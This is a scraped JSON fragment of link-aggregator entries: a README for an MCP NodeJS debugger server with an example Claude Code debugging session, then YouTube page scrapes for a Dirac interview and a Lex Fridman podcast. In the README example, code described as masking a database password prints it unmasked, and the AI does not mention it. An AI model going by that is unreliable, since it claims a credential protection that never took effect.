    "content": "MCP NodeJS Debugger\nAn MCP server that gives Claude Code access to NodeJS at runtime to help you debug: mcp-nodejs-debugger.\nGet started\n\nAdd to Claude Code:\nclaude mcp add nodejs-debugger npx @hyperdrive-eng/mcp-nodejs-debugger\n\nStart Claude Code\nclaude\n╭───────────────────────────────────────────────────────╮\n│ ✻ Welcome to Claude Code research preview!            │\n│                                                       │\n│   /help for help                                      │\n│                                                       │\n│   Found 1 MCP server (use /mcp for status)            │\n╰───────────────────────────────────────────────────────╯\n\nRun a NodeJS server in debug mode (i.e. with the --inspect flat)\n# In another terminal\nnode --inspect {your_file.js}\n\nAsk Claude Code to debug your NodeJS server at runtime\n> I'm getting a runtime error in NodeJS.\n\n  {YOUR_RUNTIME_ERROR}\n\n  Please help me debug this error at runtime using the nodejs-debugger mcp.\n\nUsage\n\nAdd to Claude Code:\nclaude mcp add nodejs-debugger npx mcp-nodejs-debugger\n\nVerify connection\n> /mcp\n  ⎿  MCP Server Status\n\n     • nodejs-debugger: connected\n\nRemove from Claude Code:\nclaude remove nodejs-debugger\n\nExample\n\nHere is a buggy NodeJS server:\nnode --inspect index.js\n\nDebugger listening on ws://127.0.0.1:9229/2862f5a2-8618-4516-8429-1248b397e9b4\n\n#######################\n## THE RUNTIME ERROR ##\n#######################\nMongooseServerSelectionError: Could not connect to any servers in your MongoDB Atlas cluster. One common reason is that you're trying to access the database from an IP that isn't whitelisted. Make sure your current IP address is on your Atlas cluster's IP whitelist: https://www.mongodb.com/docs/atlas/security-whitelist/\n    at _handleConnectionErrors (/Users/arthur/Documents/thirdparties/mdn/express-locallibrary-tutorial/node_modules/mongoose/lib/connection.js:1110:11)\n    at NativeConnection.openUri (/Users/arthur/Documents/thirdparties/mdn/express-locallibrary-tutorial/node_modules/mongoose/lib/connection.js:1041:11)\n    at async main (/Users/arthur/Documents/thirdparties/mdn/express-locallibrary-tutorial/app.js:35:3) {\n  reason: TopologyDescription {\n    type: 'ReplicaSetNoPrimary',\n    servers: Map(3) {\n      'ac-8e6hgk7-shard-00-01.cojoign.mongodb.net:27017' => [ServerDescription],\n      'ac-8e6hgk7-shard-00-02.cojoign.mongodb.net:27017' => [ServerDescription],\n      'ac-8e6hgk7-shard-00-00.cojoign.mongodb.net:27017' => [ServerDescription]\n    },\n    stale: false,\n    compatible: true,\n    heartbeatFrequencyMS: 10000,\n    localThresholdMS: 15,\n    setName: 'atlas-5syy8t-shard-0',\n    maxElectionId: null,\n    maxSetVersion: null,\n    commonWireVersion: 0,\n    logicalSessionTimeoutMinutes: null\n  },\n  code: undefined\n}\n\nClaude Code debugs the NodeJS server at runtime:\n> I'm getting a runtime error connecting to mongoose. Please help me debug by checking the value of\n  the mongodb configs at runtime using the nodejs-debugger mcp.\n\n  ⏺ I'll help you debug the mongoose connection issue using the Node.js debugger. Let's first understand where the\n  MongoDB connection is configured.\n\n  ⏺ Search(pattern: \"**/*.js\")…\n    ⎿ Found 100 files\n\n  ⏺ Let's set a breakpoint at the mongoose connection point and continue:\n\n  ⏺ nodejs-debugger:set_breakpoint (MCP)(file:                                                                         …\n        \"/Users/arthur/Documents/thirdparties/mdn/express-locallibrary-tutorial/app.js\",\n         line: 35)\n  ⎿ Breakpoint set successfully. ID:\n       2:34:0:file:///Users/arthur/Documents/thirdparties/mdn/express-locallibrary-tutorial/app\\.js\n\n  ⏺ Let's list all our breakpoints:\n\n  ⏺ nodejs-debugger:list_breakpoints (MCP)\n  ⎿ [\n         {\n           \"file\": \"/Users/arthur/Documents/thirdparties/mdn/express-locallibrary-tutorial/app.js\",\n           \"line\": 35,\n           \"id\": \"2:34:0:file:///Users/arthur/Documents/thirdparties/mdn/express-locallibrary-tutorial/app\\\\.js\"\n         }\n       ]\n\n  ⏺ Let's try to execute a specific piece of code to check the connection variables:\n\n  ⏺ nodejs-debugger:nodejs_inspect (MCP)(js_code: \"// Get the mongoose module and inspect connection\\nconst mongoose = …\n                                        require('mongoose');\\nconsole.log('Current mongoose version:',\n                                        mongoose.version);\\nconsole.log('Current mongoose connection state:',\n                                        mongoose.connection.readyState);\\n// Log connection string safely (without\n                                        password)\\nconst connectionString = process.env.MONGODB_URI || \\n\n                                        \\\"mongodb+srv://cooluser:coolpassword@cluster0.cojoign.mongodb.net/local_library?retryWr\n                                        ites=true&w=majority&appName=Cluster0\\\";\\nconsole.log('Connection string\n                                        (masked):', connectionString.replace(/(?<=mongodb\\\\+srv:\\\\/\\\\/\\\\w+:)(.+?)(?=@)/,\n                                         '*****'));\")\n\n  ⎿ Console output:\n       [log] Current mongoose version: 8.9.5\n       [log] Current mongoose connection state: 0\n       [log] Connection string (masked): mongodb+srv://cooluser:coolpassword@cluster0.cojoign.mongodb.net/local_library?retryWri\n       tes=true&w=majority&appName=Cluster0\n\n  ⏺ The runtime error you're seeing in your application is related to MongoDB\n    Atlas connection issues. Based on your error message, the problem is:\n\n    1. You're using placeholder credentials (\"cooluser:coolpassword\")\n\n    To fix this, you have two options:\n\n    1. Use a local MongoDB instance by changing line 29-30 in app.js to:\n    const dev_db_url = \"mongodb://127.0.0.1:27017/local_library\";\n    2. Or correctly set up MongoDB Atlas:\n      - Log into Atlas at https://cloud.mongodb.com\n      - Go to Network Access and add your current IP to whitelist\n      - Create proper database credentials\n      - Update the connection string with real credentials\n\n    Which option would you like to proceed with?",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "29d209b338460f29",
    "title": {
      "en": "Paul A. M. Dirac, Interview by Friedrich Hund (1982) [video]",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.youtube.com/watch?v=xJzrU38pGWc",
    "score": 99,
    "by": "mdp2021",
    "time": 1742657448,
    "content": "Back\n\n  KR\n\n    Skip navigation\n\n        Search\n\n  Search with your voice\n\nSign in\n\n  KR\n\n{\"@context\":\"https://schema.org\",\"@type\":\"VideoObject\",\"description\":\"Interview with Paul Adrien Maurice Dirac (1902–1984), Nobel Prize in Physics 1933, \\\"for the discovery of new productive forms of atomic theory\\\". Topics discussed: \\nSymmetry as central concept in theoretical physics. \\nSpace and time according to Lorentz. \\nMatter and anti-matter. \\nDirac's definition of symmetry. \\nFermions, Negative energy levels. \\nEinstein's general theory of relativity. \\nNatural times and lengths. \\nCosmology and gravitation. \\nRelativistic quantum mechanics. \\nAtomic constants.\",\"duration\":\"PT1234S\",\"embedUrl\":\"https://www.youtube.com/embed/xJzrU38pGWc\",\"interactionCount\":\"324820\",\"name\":\"Paul A. M. Dirac, Interview by Friedrich Hund (1982)\",\"thumbnailUrl\":[\"https://i.ytimg.com/vi/xJzrU38pGWc/hqdefault.jpg\"],\"uploadDate\":\"2023-02-17T12:49:35-08:00\",\"@id\":\"https://www.youtube.com/watch?v=xJzrU38pGWc\",\"genre\":\"Science & Technology\",\"author\":\"mehranshargh\"}\n\nPaul A. M. Dirac, Interview by Friedrich Hund (1982)SearchWatch laterShareCopy linkInfoShoppingTap to unmute2xIf playback doesn't begin shortly, try restarting your device.•Up nextLiveUpcomingCancelPlay NowYou're signed outVideos you watch may be added to the TV's watch history and influence TV recommendations. To avoid this, cancel and sign in to YouTube on your computer.CancelConfirmShareInclude playlistAn error occurred while retrieving sharing information. Please try again later.0:000:00 / 20:33•Watch full videoLive••Scroll for details\n\n      Paul A. M. Dirac, Interview by Friedrich Hund (1982)\n\n    mehranshargh\n\n    mehranshargh\n\n42.5K subscribers\n      SubscribeSubscribed\n\n        6.6KShareDownload\n  Download\n\nSave\n\n  324K views  2 years ago\n\n  324,820 views • Feb 17, 2023\n\n          Show less\n\n        Interview with Paul Adrien Maurice Dirac (1902–1984), Nobel Prize in Physics 1933, \"for the discovery of new productive forms of atomic theory\". Topics discussed:\nSymmetry as central concept in theoretical physics. …...more\n...more\n\nPeople mentioned1 personAlbert EinsteinGerman-born physicist (1879–1955)\n\n  Transcript\n\n  Follow along using the transcript.\n\n  Show transcript\n\n    mehranshargh\n\n      42.5K subscribers\n\n  Videos\n  About\n\n    VideosAbout\n\n          Show less\n\n            Paul A. M. Dirac, Interview by Friedrich Hund (1982)324,820 views324K viewsFeb 17, 20236.6KShareDownload\n  Download\n\nSave\n\n      Comments\n      443\n\n              Top comments\n\n              Newest first\n\n      In this video\n\nTranscript\n\n      Description\n\n  Paul A. M. Dirac, Interview by Friedrich Hund (1982)\n\n6.6KLikes324,820Views2023Feb 17\nInterview with Paul Adrien Maurice Dirac (1902–1984), Nobel Prize in Physics 1933, \"for the discovery of new productive forms of atomic theory\". Topics discussed:\nSymmetry as central concept in theoretical physics.\nSpace and time according to Lorentz.\nMatter and anti-matter.\nDirac's definition of symmetry.\nFermions, Negative energy levels.\nEinstein's general theory of relativity.\nNatural times and lengths.\nCosmology and gravitation.\nRelativistic quantum mechanics.\nAtomic constants.…...more\n...more\nShow less\n\nPeople mentioned1 personAlbert EinsteinGerman-born physicist (1879–1955)\n\n  Transcript\n\n  Follow along using the transcript.\n\n  Show transcript\n\n    mehranshargh\n\n      42.5K subscribers\n\n  Videos\n  About\n\n    VideosAbout\n\n      Transcript\n\nNaN / NaN\n\n  14:58\n    14:58\n  Now playing\n\n            The Scientist Who Discovered the World's Most Beautiful Equation\n\n    Newsthink\n\n    Newsthink\n\n  Verified\n\n    •\n\n    •\n\n      960K views\n\n      11 months ago\n\n  19:34\n    19:34\n  Now playing\n\n            Roger Penrose on quantum mechanics and consciousness | Full interview\n\n    The Institute of Art and Ideas\n\n    The Institute of Art and Ideas\n\n  Verified\n\n    •\n\n    •\n\n      818K views\n\n      1 year ago\n\n  16:34\n    16:34\n  Now playing\n\n            Deriving the Dirac Equation\n\n    Richard Behiel\n\n    Richard Behiel\n\n    •\n\n    •\n\n      128K views\n\n      1 year ago\n\n  27:15\n    27:15\n  Now playing\n\n            The Most Misunderstood Concept in Physics\n\n    Veritasium\n\n    Veritasium\n\n  Verified\n\n    •\n\n    •\n\n      20M views\n\n      1 year ago\n\n  13:22\n    13:22\n  Now playing\n\n            Bell's Inequality: The weirdest theorem in the world | Nobel Prize 2022\n\n    Qiskit\n\n    Qiskit\n\n  Verified\n\n    •\n\n    •\n\n      2.3M views\n\n      2 years ago\n\n  21:44\n    21:44\n  Now playing\n\n            Feynman's Lost Lecture (ft. 3Blue1Brown)\n\n    minutephysics\n\n    minutephysics\n\n  Verified\n\n    •\n\n    •\n\n      3.5M views\n\n      6 years ago\n\n  13:03\n    13:03\n  Now playing\n\n            The Crazy Mass-Giving Mechanism of the Higgs Field Simplified\n\n    Arvin Ash\n\n    Arvin Ash\n\n  Verified\n\n    •\n\n    •\n\n      1.4M views\n\n      2 years ago\n\n  1:27:59\n    1:27:59\n  Now playing\n\n            Hans Bethe lecture, My Relation to the Early Quantum Mechanics, November 21, 1977\n\n    AIP History\n\n    AIP History\n\n    •\n\n    •\n\n      51K views\n\n      2 years ago\n\n  1:16:07\n    1:16:07\n  Now playing\n\n            Lecture 1: Introduction to Superposition\n\n    MIT OpenCourseWare\n\n    MIT OpenCourseWare\n\n    •\n\n    •\n\n      7.9M views\n\n      10 years ago\n\n  18:33\n    18:33\n  Now playing\n\n            Lagrangian and Hamiltonian Mechanics in Under 20 Minutes: Physics Mini Lesson\n\n    Physics with Elliot\n\n    Physics with Elliot\n\n    •\n\n    •\n\n      1.2M views\n\n      3 years ago\n\n  29:06\n    29:06\n  Now playing\n\n            Discovering the relativistic Dirac equation with Paul Dirac and graphene\n\n    Professor Nano\n\n    Professor Nano\n\n    •\n\n    •\n\n      50K views\n\n      1 year ago\n\n  26:29\n    26:29\n  Now playing\n\n            How Feynman did quantum mechanics (and you should too)\n\n    Physics with Elliot\n\n    Physics with Elliot\n\n    •\n\n    •\n\n      559K views\n\n      1 year ago\n\n  46:00\n    46:00\n  Now playing\n\n            Dirac Conversation: Edward Witten\n\n    Int'l Centre for Theoretical Physics\n\n    Int'l Centre for Theoretical Physics\n\n    •\n\n    •\n\n      223K views\n\n      10 months ago\n\n  21:08\n    21:08\n  Now playing\n\n            Great Physicists: Paul A.M. Dirac - The Taciturn Genius\n\n    Unzicker's Real Physics\n\n    Unzicker's Real Physics\n\n    •\n\n    •\n\n      99K views\n\n      4 years ago\n\n  1:27:57\n    1:27:57\n  Now playing\n\n            Roger Penrose: Physics of Consciousness and the Infinite Universe | Lex Fridman Podcast #85\n\n    Lex Fridman\n\n    Lex Fridman\n\n  Verified\n\n    •\n\n    •\n\n      2.3M views\n\n      4 years ago\n\n  15:53\n    15:53\n  Now playing\n\n            Quantum Field Theory visualized\n\n    ScienceClic English\n\n    ScienceClic English\n\n  Verified\n\n    •\n\n    •\n\n      2.2M views\n\n      4 years ago\n\n  36:42\n    36:42\n  Now playing\n\n            Richard Feynman - The World from another point of view\n\n    mrtp\n\n    mrtp\n\n    •\n\n    •\n\n      1.5M views\n\n      9 years ago\n\n  1:09:42\n    1:09:42\n  Now playing\n\n            The Mystery of Spinors\n\n    Richard Behiel\n\n    Richard Behiel\n\n    •\n\n    •\n\n      1.2M views\n\n      1 year ago\n\n  22:44\n    22:44\n  Now playing\n\n            Field Theory Fundamentals in 20 Minutes!\n\n    Physics with Elliot\n\n    Physics with Elliot\n\n    •\n\n    •\n\n      706K views\n\n      3 years ago\n\n  1:00:18\n    1:00:18\n  Now playing\n\n            Quantum Fields: The Real Building Blocks of the Universe - with David Tong\n\n    The Royal Institution\n\n    The Royal Institution\n\n  Verified\n\n    •\n\n    •\n\n      6.5M views\n\n      8 years ago\n\nShow more",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "001e435f8052148a",
    "title": {
      "en": "ThePrimeagen: Programming, AI, ADHD, Productivity, Addiction, and God",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.youtube.com/watch?v=tNZnLkRBYA8",
    "score": 6,
    "by": "doppp",
    "time": 1742715671,
    "content": "Back\n\n  KR\n\n    Skip navigation\n\n        Search\n\n  Search with your voice\n\nSign in\n\n  KR\n\n{\"@context\":\"https://schema.org\",\"@type\":\"VideoObject\",\"description\":\"ThePrimeagen (aka Michael Paulson) is a programmer who has educated, entertained, and inspired millions of people to build software and have fun doing it.\\nThank you for listening ❤ Check out our sponsors: https://lexfridman.com/sponsors/ep461-sb\\nSee below for timestamps, transcript, and to give feedback, submit questions, contact Lex, etc.\\n\\n*Transcript:*\\nhttps://lexfridman.com/theprimeagen-transcript\\n\\n*CONTACT LEX:*\\n*Feedback* - give feedback to Lex: https://lexfridman.com/survey\\n*AMA* - submit questions, videos or call-in: https://lexfridman.com/ama\\n*Hiring* - join our team: https://lexfridman.com/hiring\\n*Other* - other ways to get in touch: https://lexfridman.com/contact\\n\\n*SMALL CORRECTION NOTE:*\\nWhen Prime talks about how grateful he is for his amazing wife and family, we show an incorrect photo, so I blurred it. Here's some correct ones:\\nhttps://x.com/ThePrimeagen/status/1586458511810080769\\nhttps://x.com/ThePrimeagen/status/1771638039430771125\\n\\n*EPISODE LINKS:*\\nThePrimeagen's X: https://twitter.com/ThePrimeagen\\nThePrimeagen's YouTube: https://youtube.com/ThePrimeTimeagen\\nThePrimeagen's Twitch: https://twitch.tv/ThePrimeagen\\nThePrimeagen's GitHub: https://github.com/theprimeagen\\nThePrimeagen's TikTok: https://tiktok.com/@theprimeagen\\nThePrimeagen's Coffee: https://www.terminal.shop/\\n\\n*SPONSORS:*\\nTo support this podcast, check out our sponsors & get discounts:\\n*Invideo AI:* AI video generator.\\nGo to https://lexfridman.com/s/invideoai-ep461-sb\\n*Shopify:* Sell stuff online.\\nGo to https://lexfridman.com/s/shopify-ep461-sb\\n*NetSuite:* Business management software.\\nGo to https://lexfridman.com/s/netsuite-ep461-sb\\n*BetterHelp:* Online therapy and counseling.\\nGo to https://lexfridman.com/s/betterhelp-ep461-sb\\n*AG1:* All-in-one daily nutrition drinks.\\nGo to https://lexfridman.com/s/ag1-ep461-sb\\n\\n*OUTLINE:*\\n0:00 - Introduction\\n0:42 - Love for programming\\n10:15 - Hardest part of programming\\n12:31 - Types of programming\\n20:08 - Life story\\n30:12 - Hardship\\n31:44 - High school\\n37:30 - Porn addiction\\n47:16 - God\\n1:02:59 - Perseverance\\n1:12:55 - Netflix\\n1:25:23 - Groovy\\n1:30:27 - Printf() debugging\\n1:36:49 - Falcor\\n1:46:19 - Breaking production\\n1:49:04 - Pieter Levels\\n1:53:34 - Netflix, Twitch, and YouTube infrastructure\\n2:05:36 - ThePrimeagen origin story\\n2:20:52 - Learning programming languages\\n2:29:55 - Best programming languages in 2025\\n2:34:50 - Python\\n2:35:30 - HTML & CSS\\n2:36:20 - Bash\\n2:37:00 - FFmpeg\\n2:43:42 - Performance\\n2:46:15 - Rust\\n2:51:03 - Epic projects\\n3:04:27 - Asserts\\n3:13:41 - ADHD\\n3:21:49 - Productivity\\n3:26:13 - Programming setup\\n4:01:43 - Coffee\\n4:08:47 - Programming with AI\\n4:51:31 - Advice for young programmers\\n5:03:03 - Reddit questions\\n5:10:35 - God\\n\\n*PODCAST LINKS:*\\n- Podcast Website: https://lexfridman.com/podcast\\n- Apple Podcasts: https://apple.co/2lwqZIr\\n- Spotify: https://spoti.fi/2nEwCF8\\n- RSS: https://lexfridman.com/feed/podcast/\\n- Podcast Playlist: https://www.youtube.com/playlist?list=PLrAXtmErZgOdP_8GztsuKi9nrraNbKKp4\\n- Clips Channel: https://www.youtube.com/lexclips\\n\\n*SOCIAL LINKS:*\\n- X: https://x.com/lexfridman\\n- Instagram: https://instagram.com/lexfridman\\n- TikTok: https://tiktok.com/@lexfridman\\n- LinkedIn: https://linkedin.com/in/lexfridman\\n- Facebook: https://facebook.com/lexfridman\\n- Patreon: https://patreon.com/lexfridman\\n- Telegram: https://t.me/lexfridman\\n- Reddit: https://reddit.com/r/lexfridman\",\"duration\":\"PT19211S\",\"embedUrl\":\"https://www.youtube.com/embed/tNZnLkRBYA8\",\"interactionCount\":\"244471\",\"name\":\"ThePrimeagen: Programming, AI, ADHD, Productivity, Addiction, and God | Lex Fridman Podcast #461\",\"thumbnailUrl\":[\"https://i.ytimg.com/vi/tNZnLkRBYA8/maxresdefault.jpg\"],\"uploadDate\":\"2025-03-22T10:15:01-07:00\",\"@id\":\"https://www.youtube.com/watch?v=tNZnLkRBYA8\",\"genre\":\"Science & Technology\",\"author\":\"Lex Fridman\"}\n\nThePrimeagen: Programming, AI, ADHD, Productivity, Addiction, and God | Lex Fridman Podcast #461SearchWatch laterShareCopy linkInfoShoppingTap to unmute2xIf playback doesn't begin shortly, try restarting your device.•You're signed outVideos you watch may be added to the TV's watch history and influence TV recommendations. To avoid this, cancel and sign in to YouTube on your computer.CancelConfirmUp nextLiveUpcomingCancelPlay NowLex FridmanSubscribeSubscribedShareInclude playlistAn error occurred while retrieving sharing information. Please try again later.0:000:00 / 5:20:10•Watch full videoLive•Introduction•Scroll for details\n\n      ThePrimeagen: Programming, AI, ADHD, Productivity, Addiction, and God | Lex Fridman Podcast #461\n\n    Lex Fridman\n\n    Lex Fridman\n\n  Verified\n\n4.66M subscribers\n      SubscribeSubscribed\n\n        1234567890123456789012345678912345678901234567890123456789KShareDownload\n  Download\n\nSave\n\n  244,471 views  16 hours ago  Lex Fridman Podcast\n\n  244,471 views • Mar 22, 2025 • Lex Fridman Podcast\n\n          Show less\n\n        ThePrimeagen (aka Michael Paulson) is a programmer who has educated, entertained, and inspired millions of people to build software and have fun doing it.\nThank you for listening ❤ Check out our sponsors: https://lexfridman.com/sponsors/ep461-sb…...more\n...more\n\n      Chapters\n\n  View all\n\n    Introduction\n    Introduction\n    0:00\n\n    Introduction\n\n  0:00\n\n    Love for programming\n    Love for programming\n    0:42\n\n    Love for programming\n\n  0:42\n\n    Hardest part of programming\n    Hardest part of programming\n    10:15\n\n    Hardest part of programming\n\n  10:15\n\n    Types of programming\n    Types of programming\n    12:31\n\n    Types of programming\n\n  12:31\n\n    Life story\n    Life story\n    20:08\n\n    Life story\n\n  20:08\n\n    Hardship\n    Hardship\n    30:12\n\n    Hardship\n\n  30:12\n\n    High school\n    High school\n    31:44\n\n    High school\n\n  31:44\n\n    Porn addiction\n    Porn addiction\n    37:30\n\n    Porn addiction\n\n  37:30\n\n  Explore the podcast\n\n    456 episodes\n\n456 episodes\n\n  Lex Fridman Podcast\n  Lex Fridman\n\n    Podcasts\n\n  Transcript\n\n  Follow along using the transcript.\n\n  Show transcript\n\n    Lex Fridman\n\n      4.66M subscribers\n\n  Videos\n  About\n\n    VideosAboutLex Clips ChannelTwitter\n\n          Show less\n\n            Lex Fridman PodcastThePrimeagen: Programming, AI, ADHD, Productivity, Addiction, and God | Lex Fridman Podcast #461244,471 viewsMar 22, 20251234567890123456789012345678912345678901234567890123456789KShareDownload\n  Download\n\nSave\n\n      Comments\n      1.4K\n\n              Top comments\n\n              Newest first\n\n      In this video\n\nTimelineChaptersTranscript\n\n      Chapters\n\n    Introduction\n    Introduction\n    0:00\n\n    Introduction\n\n  0:00\n\n    Love for programming\n    Love for programming\n    0:42\n\n    Love for programming\n\n  0:42\n\n    Hardest part of programming\n    Hardest part of programming\n    10:15\n\n    Hardest part of programming\n\n  10:15\n\n    Types of programming\n    Types of programming\n    12:31\n\n    Types of programming\n\n  12:31\n\n    Life story\n    Life story\n    20:08\n\n    Life story\n\n  20:08\n\n    Hardship\n    Hardship\n    30:12\n\n    Hardship\n\n  30:12\n\n    High school\n    High school\n    31:44\n\n    High school\n\n  31:44\n\n    Porn addiction\n    Porn addiction\n    37:30\n\n    Porn addiction\n\n  37:30\n\n    God\n    God\n    47:16\n\n    God\n\n  47:16\n\n    Perseverance\n    Perseverance\n    1:02:59\n\n    Perseverance\n\n  1:02:59\n\n    Netflix\n    Netflix\n    1:12:55\n\n    Netflix\n\n  1:12:55\n\n    Groovy\n    Groovy\n    1:25:23\n\n    Groovy\n\n  1:25:23\n\n    Printf() debugging\n    Printf() debugging\n    1:30:27\n\n    Printf() debugging\n\n  1:30:27\n\n    Falcor\n    Falcor\n    1:36:49\n\n    Falcor\n\n  1:36:49\n\n    Breaking production\n    Breaking production\n    1:46:19\n\n    Breaking production\n\n  1:46:19\n\n    Pieter Levels\n    Pieter Levels\n    1:49:04\n\n    Pieter Levels\n\n  1:49:04\n\n    Netflix, Twitch, and YouTube infrastructure\n    Netflix, Twitch, and YouTube infrastructure\n    1:53:34\n\n    Netflix, Twitch, and YouTube infrastructure\n\n  1:53:34\n\n    ThePrimeagen origin story\n    ThePrimeagen origin story\n    2:05:36\n\n    ThePrimeagen origin story\n\n  2:05:36\n\n    Learning programming languages\n    Learning programming languages\n    2:20:52\n\n    Learning programming languages\n\n  2:20:52\n\n    Best programming languages in 2025\n    Best programming languages in 2025\n    2:29:55\n\n    Best programming languages in 2025\n\n  2:29:55\n\n    Python\n    Python\n    2:34:50\n\n    Python\n\n  2:34:50\n\n    HTML & CSS\n    HTML & CSS\n    2:35:30\n\n    HTML & CSS\n\n  2:35:30\n\n    Bash\n    Bash\n    2:36:20\n\n    Bash\n\n  2:36:20\n\n    FFmpeg\n    FFmpeg\n    2:37:00\n\n    FFmpeg\n\n  2:37:00\n\n    Performance\n    Performance\n    2:43:42\n\n    Performance\n\n  2:43:42\n\n    Rust\n    Rust\n    2:46:15\n\n    Rust\n\n  2:46:15\n\n    Epic projects\n    Epic projects\n    2:51:03\n\n    Epic projects\n\n  2:51:03\n\n    Asserts\n    Asserts\n    3:04:27\n\n    Asserts\n\n  3:04:27\n\n    ADHD\n    ADHD\n    3:13:41\n\n    ADHD\n\n  3:13:41\n\n    Productivity\n    Productivity\n    3:21:49\n\n    Productivity\n\n  3:21:49\n\n    Programming setup\n    Programming setup\n    3:26:13\n\n    Programming setup\n\n  3:26:13\n\n    Coffee\n    Coffee\n    4:01:43\n\n    Coffee\n\n  4:01:43\n\n    Programming with AI\n    Programming with AI\n    4:08:47\n\n    Programming with AI\n\n  4:08:47\n\n    Advice for young programmers\n    Advice for young programmers\n    4:51:31\n\n    Advice for young programmers\n\n  4:51:31\n\n    Reddit questions\n    Reddit questions\n    5:03:03\n\n    Reddit questions\n\n  5:03:03\n\n    God\n    God\n    5:10:35\n\n    God\n\n  5:10:35\n\n    Sync to video time\n\n  Sync to video time\n\n      Description\n\n  ThePrimeagen: Programming, AI, ADHD, Productivity, Addiction, and God | Lex Fridman Podcast #461\n\n12KLikes244,471Views16hAgo\nThePrimeagen (aka Michael Paulson) is a programmer who has educated, entertained, and inspired millions of people to build software and have fun doing it.\nThank you for listening ❤ Check out our sponsors: https://lexfridman.com/sponsors/ep461-sb\nSee below for timestamps, transcript, and to give feedback, submit questions, contact Lex, etc.\n\nTranscript:\nhttps://lexfridman.com/theprimeagen-t...\n\nCONTACT LEX:\nFeedback - give feedback to Lex: https://lexfridman.com/survey\nAMA - submit questions, videos or call-in: https://lexfridman.com/ama\nHiring - join our team: https://lexfridman.com/hiring\nOther - other ways to get in touch: https://lexfridman.com/contact\n\nSMALL CORRECTION NOTE:\nWhen Prime talks about how grateful he is for his amazing wife and family, we show an incorrect photo, so I blurred it. Here's some correct ones:\nhttps://x.com/ThePrimeagen/status/158...\nhttps://x.com/ThePrimeagen/status/177...\n\nEPISODE LINKS:\nThePrimeagen's X: /theprimeagen\nThePrimeagen's YouTube: /theprimetimeagen\nThePrimeagen's Twitch: /theprimeagen\nThePrimeagen's GitHub: https://github.com/theprimeagen\nThePrimeagen's TikTok: /theprimeagen\nThePrimeagen's Coffee: https://www.terminal.shop/\n\nSPONSORS:\nTo support this podcast, check out our sponsors & get discounts:\nInvideo AI: AI video generator.\nGo to https://lexfridman.com/s/invideoai-ep...\nShopify: Sell stuff online.\nGo to https://lexfridman.com/s/shopify-ep46...\nNetSuite: Business management software.\nGo to https://lexfridman.com/s/netsuite-ep4...\nBetterHelp: Online therapy and counseling.\nGo to https://lexfridman.com/s/betterhelp-e...\nAG1: All-in-one daily nutrition drinks.\nGo to https://lexfridman.com/s/ag1-ep461-sb\n\nOUTLINE:\n0:00 - Introduction\n0:42 - Love for programming\n10:15 - Hardest part of programming\n12:31 - Types of programming\n20:08 - Life story\n30:12 - Hardship\n31:44 - High school\n37:30 - Porn addiction\n47:16 - God\n1:02:59 - Perseverance\n1:12:55 - Netflix\n1:25:23 - Groovy\n1:30:27 - Printf() debugging\n1:36:49 - Falcor\n1:46:19 - Breaking production\n1:49:04 - Pieter Levels\n1:53:34 - Netflix, Twitch, and YouTube infrastructure\n2:05:36 - ThePrimeagen origin story\n2:20:52 - Learning programming languages\n2:29:55 - Best programming languages in 2025\n2:34:50 - Python\n2:35:30 - HTML & CSS\n2:36:20 - Bash\n2:37:00 - FFmpeg\n2:43:42 - Performance\n2:46:15 - Rust\n2:51:03 - Epic projects\n3:04:27 - Asserts\n3:13:41 - ADHD\n3:21:49 - Productivity\n3:26:13 - Programming setup\n4:01:43 - Coffee\n4:08:47 - Programming with AI\n4:51:31 - Advice for young programmers\n5:03:03 - Reddit questions\n5:10:35 - God\n\nPODCAST LINKS:\nPodcast Website: https://lexfridman.com/podcast\nApple Podcasts: https://apple.co/2lwqZIr\nSpotify: https://spoti.fi/2nEwCF8\nRSS: https://lexfridman.com/feed/podcast/\nPodcast Playlist: •LexFridmanPodcast\nClips Channel: /lexclips\n\nSOCIAL LINKS:\nX: https://x.com/lexfridman\nInstagram: /lexfridman\nTikTok: /lexfridman\nLinkedIn: /lexfridman\nFacebook: /lexfridman\nPatreon: /lexfridman\nTelegram: https://t.me/lexfridman\nReddit: /lexfridman…...more\n...more\nShow less\n\n      Chapters\n\n  View all\n\n    Introduction\n    Introduction\n    0:00\n\n    Introduction\n\n  0:00\n\n    Love for programming\n    Love for programming\n    0:42\n\n    Love for programming\n\n  0:42\n\n    Hardest part of programming\n    Hardest part of programming\n    10:15\n\n    Hardest part of programming\n\n  10:15\n\n    Types of programming\n    Types of programming\n    12:31\n\n    Types of programming\n\n  12:31\n\n  Explore the podcast\n\n    456 episodes\n\n456 episodes\n\n  Lex Fridman Podcast\n  Lex Fridman\n\n    Podcasts\n\n  Transcript\n\n  Follow along using the transcript.\n\n  Show transcript\n\n    Lex Fridman\n\n      4.66M subscribers\n\n  Videos\n  About\n\n    VideosAboutLex Clips ChannelTwitter\n\n      Transcript\n\nNaN / NaN\n\n  2:16:31\n    2:16:31\n  Now playing\n\n            Nikhil Kamath ft. Perplexity CEO, Aravind Srinivas | WTF Online Ep 1.\n\n    Nikhil Kamath\n\n    Nikhil Kamath\n\n    •\n\n    •\n\n      8.1K views\n\n      1 hour ago\n\n          New\n\n  9:25\n    9:25\n  Now playing\n\n            How to learn programming | ThePrimeagen and Lex Fridman\n\n    Lex Clips\n\n    Lex Clips\n\n  Verified\n\n    •\n\n    •\n\n      7.7K views\n\n      5 hours ago\n\n          New\n\n  3:17:34\n    3:17:34\n  Now playing\n\n            Narendra Modi: Prime Minister of India - Power, Democracy, War & Peace | Lex Fridman Podcast #460\n\n    Lex Fridman\n\n    Lex Fridman\n\n  Verified\n\n    •\n\n    •\n\n      4M views\n\n      6 days ago\n\n          New\n\n  23:23\n    23:23\n  Now playing\n\n            already lost.\n\n    Ludwig\n\n    Ludwig\n\n  Verified\n\n    •\n\n    •\n\n      446K views\n\n      9 hours ago\n\n          New\n\n  25:14\n    25:14\n  Now playing\n\n            Actuate 2024 | Sergey Levine | Robotic Foundation Models\n\n    Foxglove\n\n    Foxglove\n\n    •\n\n    •\n\n      6.3K views\n\n      4 months ago\n\n  29:12\n    29:12\n  Now playing\n\n            His upgrade got me really dirty - AMD $5000 Ultimate Tech Upgrade\n\n    Linus Tech Tips\n\n    Linus Tech Tips\n\n  Verified\n\n    •\n\n    •\n\n      764K views\n\n      15 hours ago\n\n          New\n\n  9:29\n    9:29\n  Now playing\n\n            Los 